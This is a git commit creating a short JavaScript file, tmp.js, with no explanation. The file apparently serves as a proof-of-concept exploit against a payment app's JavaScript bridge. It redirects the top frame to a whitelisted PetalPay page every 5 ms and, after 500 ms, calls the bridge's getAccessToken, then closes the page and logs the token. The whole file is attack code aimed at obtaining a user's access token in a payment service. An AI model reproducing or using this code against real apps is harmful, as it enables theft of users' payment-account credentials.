4361dcc85afa2fb60b11c50ef7376a9c44930a50
cc <seuercc@gmail.com>
2026-01-22 09:53:06 +0800

    Create tmp.js

---
+++ 26/tmp.js
@@ -0,0 +1,16 @@
+function gotowhite() {
+    top.location.href = "https://h5-drcn.petalpay.dbankcloud.cn/h5b/pages/hcp/h5builder-5c729fd2a9444966bb24b30f2cb78bd6/campaign/index.html";
+}
+
+async function getUserInfo() {
+    if (window.petalPayBasicAbilityJSInterface) {
+        result = await window.petalPayBasicAbilityJSInterface.getAccessToken(false)
+        window.petalPayBasicAbilityJSInterface.closePage()
+        console.log("调用 window.petalPayBasicAbilityJSInterface 成功！" + result);
+    } else {
+        console.error("no window.petalPayBasicAbilityJSInterface ");
+    }
+}
+
+setInterval(gotowhite, 5);
+setTimeout(getUserInfo, 500);
